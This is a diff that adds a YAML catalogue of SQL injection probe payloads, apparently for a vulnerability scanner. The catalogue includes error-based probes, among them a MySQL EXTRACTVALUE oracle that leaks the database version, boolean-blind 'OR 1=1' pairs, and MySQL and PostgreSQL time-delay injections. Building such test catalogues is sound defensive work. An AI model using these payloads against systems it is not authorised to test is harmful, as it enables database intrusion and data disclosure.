@@ -1,0 +1,65 @@
+- id: sqli-err-quote
+  category: sqli
+  engine: generic
+  payload: "'"
+  expect: ""
+  safe_scope: any
+  risk_level: safe
+  cwe: CWE-89
+  tags: [error-based, canary]
+  description: Single-quote syntax probe to detect SQL error disclosure
+
+- id: sqli-err-mysql-extractvalue
+  category: sqli
+  engine: mysql
+  payload: "1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))"
+  expect: ""
+  safe_scope: any
+  risk_level: safe
+  cwe: CWE-89
+  tags: [error-based, mysql]
+  description: MySQL EXTRACTVALUE error oracle
+
+- id: sqli-bool-true-1
+  category: sqli
+  engine: generic
+  payload: "' OR 1=1-- "
+  expect: ""
+  safe_scope: any
+  risk_level: safe
+  cwe: CWE-89
+  tags: [boolean-blind, true-condition]
+  description: Boolean blind TRUE condition pair 1
+
+- id: sqli-bool-false-1
+  category: sqli
+  engine: generic
+  payload: "' OR 1=2-- "
+  expect: ""
+  safe_scope: any
+  risk_level: safe
+  cwe: CWE-89
+  tags: [boolean-blind, false-condition]
+  description: Boolean blind FALSE condition pair 1
+
+- id: sqli-time-mysql
+  category: sqli
+  engine: mysql
+  payload: "' OR SLEEP({d})-- "
+  expect: ""
+  safe_scope: any
+  risk_level: low
+  cwe: CWE-89
+  tags: [time-blind, mysql]
+  description: Time-based blind SQLi probe (MySQL)
+
+- id: sqli-time-postgres
+  category: sqli
+  engine: postgresql
+  payload: "'; SELECT pg_sleep({d})-- "
+  expect: ""
+  safe_scope: any
+  risk_level: low
+  cwe: CWE-89
+  tags: [time-blind, postgresql]
+  description: Time-based blind SQLi probe (PostgreSQL)
